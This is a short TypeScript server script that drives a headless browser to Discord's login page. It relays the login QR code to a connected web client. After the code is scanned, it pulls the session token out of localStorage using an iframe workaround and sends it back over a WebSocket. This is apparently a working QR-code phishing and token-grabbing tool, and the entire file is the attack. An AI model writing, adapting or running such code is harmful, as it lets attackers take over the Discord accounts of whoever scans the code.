import * as express from 'express';
import * as puppeteer from 'puppeteer';
import {  WebSocketServer } from 'ws';
import { readFileSync, unlinkSync } from "fs";

async function wait(timeout) {
    return new Promise((resolve)=>{
        setTimeout(resolve, timeout);
    })
}

if (process.cwd().endsWith('dist')) {
    process.chdir('..')
}
const app = express();

app.use(express.static('static'));

const wss = new WebSocketServer({
    port: 8082,
});

let i = 0; // connection id
wss.on('connection', async (ws)=>{
    i++;
    try {
        const selector = 'div.qrCodeOverlay-2bLtKl';
        const browser = await puppeteer.launch({
            headless: true,
            args: [`--window-size=1920,1080`], // set the size to 1080 to make sure we can see the qr code
            defaultViewport: {
                width:1920,
                height:1080
            }
        });
        const page = await browser.newPage();
        await page.goto('https://discord.com/login')
        await page.waitForSelector(selector);
        await wait(5000);
        const element = await page.$(selector);
        console.log(element)
        await element.screenshot({path: `tmp-${i}.png`});
        const pngBytes = readFileSync(`tmp-${i}.png`);
        unlinkSync(`tmp-${i}.png`);
        ws.send(JSON.stringify({
            type: 'qr',
            url: `data:image/png;base64,${pngBytes.toString('base64')}`,
        }))
        ws.on('close', async ()=>{
            await browser.close();
        })
        await page.waitForNavigation();
        const token = await page.evaluate(()=>{
            /*
            Epic discord localStorage = null bypass
            See: https://stackoverflow.com/questions/52509440/discord-window-localstorage-is-undefined-how-to-get-access-to-the-localstorage
             */
            function getLocalStoragePropertyDescriptor() {
                const iframe = document.createElement('iframe');
                document.head.append(iframe);
                const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');
                iframe.remove();
                return pd;
            }

            Object.defineProperty(window, 'localStorage', getLocalStoragePropertyDescriptor());

            return localStorage.token;
        })

        ws.send(JSON.stringify({
            type: 'token',
            token
        }));
        await browser.close();
    } catch (ex) {
        console.error(ex);
    }
})

app.listen(8081);
